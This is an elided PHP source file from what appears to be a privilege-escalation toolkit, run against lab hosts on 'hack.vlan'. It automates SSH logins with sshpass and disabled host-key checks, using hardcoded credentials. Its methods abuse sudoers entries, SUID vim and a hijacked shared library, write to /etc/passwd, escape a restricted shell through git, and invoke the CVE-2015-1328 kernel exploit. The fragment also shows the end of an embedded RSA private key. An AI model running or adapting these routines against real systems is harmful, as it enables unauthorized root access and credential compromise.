<?php
class poc4root extends poc4net {
    ...
    public function poc4root2rootkit4userland2azazel(){
        ...
        $test->poc($flag_poc);
        $stream = $test->stream8ssh8passwd($test->ip, $test->port, $user_name_created,$user_name_pass);
        
        $template_cmd = "sshpass -p '$user_name_pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $user_name_created@$test->ip -p $test->port -C  '%CMD%'";
    ...
    public function poc4root8users2sudoers8filepath(){
        ...
        if (is_resource($stream)){
            ...
            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$user_name_pass);
            $obj_lan->poc($test->flag_poc);
            $user_sudo_list = $obj_lan->users2sudoers2list($obj_lan->uid_name,$obj_lan->uid_pass);
            return $obj_lan->users2sudoers8filepath($user_sudo_list);
    ...
    public function poc4root8test(){
        ...
        $port = "22";
        $protocol = "T";
        $user_name_created = "morag" ;
        $user_name_pass = "yondu";
        ...
        $template_cmd = "sshpass -p '$user_name_pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $user_name_created@$test->ip -p $test->port -C  '%CMD%'";
        list($stream,$template_id,$template_cmd,$template_shell) = $test->stream4check($stream,$template_cmd,$user_name_created,$user_name_pass);
        ...
        if (is_resource($stream)){
            ...
            //$suid = "/usr/bin/sky";
            //return $obj_lan->misc();
            //return $obj_lan->users();
            //return $obj_lan->suids();
            return $obj_lan->users2sudoers();
            //return $obj_lan->suids4one($suid);
            //return $obj_lan->lan4root();
        }       
    }
    ...
    public function poc4root8users(){
        ...
        if (is_resource($stream)){
            ...
            $sql = "select uid_name,from_base64(templateB64_id),from_base64(templateB64_cmd),from_base64(templateB64_shell) FROM LAN where id8port=$test->port2id ;";
    ...
    public function poc4root8restricted_bash_sudoers8app2write8cp2etc_passwd(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
    ...
    public function poc4root8restricted_bash_sudoers8app2cmd2git(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
    ...
    public function poc4root8restricted_bash_su(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
    ...
    public function poc4root8suid8app2vim(){
        ...
        if (is_resource($stream)){
            ...
            //$obj_lan->suids();
            $suid = "/usr/bin/vim.basic";
            $sudo = FALSE;
            $obj_lan->lan2root8bin($suid,$sudo,$obj_lan->uid_pass);
...
-----END RSA PRIVATE KEY-----";
    ...
    public function poc4root8suid8app2lib(){
        ...
        if (is_resource($stream)){
            ...
            $strings_etc_passwd = $this->lan2stream4result($data, $timeout);
            ...
            $lib = "/home/user/.config/libcalc.so";
            $suid= "/bin/calc";
            
            return $obj_lan->suids8app2lib($lib,$suid);
    ...
    public function poc4root8restricted_bash_exploit8kernel_37292_CVE_2015_1328(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
